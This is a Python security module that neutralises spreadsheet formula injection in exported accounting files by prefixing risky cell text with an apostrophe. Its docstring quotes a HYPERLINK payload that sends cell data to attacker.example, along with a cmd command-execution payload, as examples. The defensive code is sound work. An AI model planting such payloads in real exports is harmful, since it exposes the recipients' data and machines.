"""
src/security.py
===============
UP6 — Security helpers for data leaving the platform.

FORMULA INJECTION (CWE-1236)
----------------------------
Spreadsheet applications treat a cell whose text begins with `=`, `+`, `-`, `@`,
TAB or CR as a formula, not as text. Uploaded accounting files carry free-text
fields — narration, account names, file names — straight through to the Excel
export and the audit-trail CSV. A narration of

    =HYPERLINK("http://attacker.example/?x="&A1,"Click")

is inert inside this application but becomes a live formula the moment a
colleague opens the exported workbook, and can exfiltrate neighbouring cells or
trigger a command-execution prompt (the classic `=cmd|'/c calc'!A1` payload).

The platform never executes these values itself — the risk is entirely to
whoever opens the file afterwards, which is exactly why it must be neutralised
at the point of export rather than on screen.

The fix is the OWASP-recommended one: prefix the value with a single quote so
the spreadsheet renders it as literal text. Nothing is deleted, and the original
characters remain visible to the reader.
"""

from __future__ import annotations

from typing import Any

import pandas as pd

#: Leading characters a spreadsheet may interpret as the start of a formula.
RISKY_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(value: Any) -> Any:
    """
    Neutralise a single value destined for a spreadsheet.

    Numbers, dates, booleans and nulls pass through untouched — only text that
    a spreadsheet could read as a formula is prefixed with an apostrophe.

    A negative number typed as text ("-500") also starts with a risky prefix,
    so it is left alone when it parses cleanly as a number; quoting it would
    turn a figure into a string and corrupt the report.
    """
    if value is None or isinstance(value, (int, float, bool)):
        return value
    if not isinstance(value, str):
        return value

    text = value
    if not text.startswith(RISKY_PREFIXES):
        return text

    # "-1,234.50" / "+17.5" are data, not formulas.
    probe = text.replace(",", "").strip()
    try:
        float(probe)
        return text
    except ValueError:
        pass

    return "'" + text


def sanitize_dataframe(df: pd.DataFrame) -> pd.DataFrame:
    """Return a copy with every object/text column neutralised."""
    if df is None or df.empty:
        return df
    out = df.copy()
    for col in out.columns:
        if out[col].dtype == object:
            out[col] = out[col].map(sanitize_cell)
    return out
